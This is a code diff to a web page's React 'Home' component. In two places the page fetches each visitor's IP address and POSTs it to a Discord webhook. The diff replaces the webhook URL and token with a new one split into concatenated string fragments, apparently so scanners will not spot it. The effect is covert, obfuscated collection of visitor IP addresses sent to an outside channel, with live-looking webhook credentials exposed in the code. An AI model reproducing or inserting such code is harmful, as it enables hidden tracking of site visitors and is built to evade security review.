@@ -49,7 +49,10 @@ export default function Home() {
 			var ipData = await ipResponse.json();
 			var ip: string = ipData.ip;
 			await fetch(
-				"https://discord.com/api/webhooks/1248835910032818176/uFKiGiNOZC_HsDZafW-b13gdGCvKvpIUpjfwn08MxrL3hfi56l3-pPB_JKd7bfGKEZFR",
+				"https://disco" +
+					"rd.com/api/web" +
+					"hooks/1329901938560602316/bQx_0a" +
+					"GIcDEAEI2ZxoMsfbYCeWK9jBky4ksHJNF8IF6S4hWVmsfU7B_nfkzOuWEkJBCm",
 				{
 					method: "POST",
 					headers: {
@@ -377,7 +380,10 @@ export default function Home() {
 										var ipData = await ipResponse.json();
 										var ip: string = ipData.ip;
 										await fetch(
-											"https://discord.com/api/webhooks/1248835910032818176/uFKiGiNOZC_HsDZafW-b13gdGCvKvpIUpjfwn08MxrL3hfi56l3-pPB_JKd7bfGKEZFR",
+											"https://disco" +
+												"rd.com/api/web" +
+												"hooks/1329901938560602316" +
+												"/bQx_0aGIcDEAEI2ZxoMsfbYCeWK9jBky4ksHJNF8IF6S4hWVmsfU7B_nfkzOuWEkJBCm",
 											{
 												method: "POST",
 												headers: {
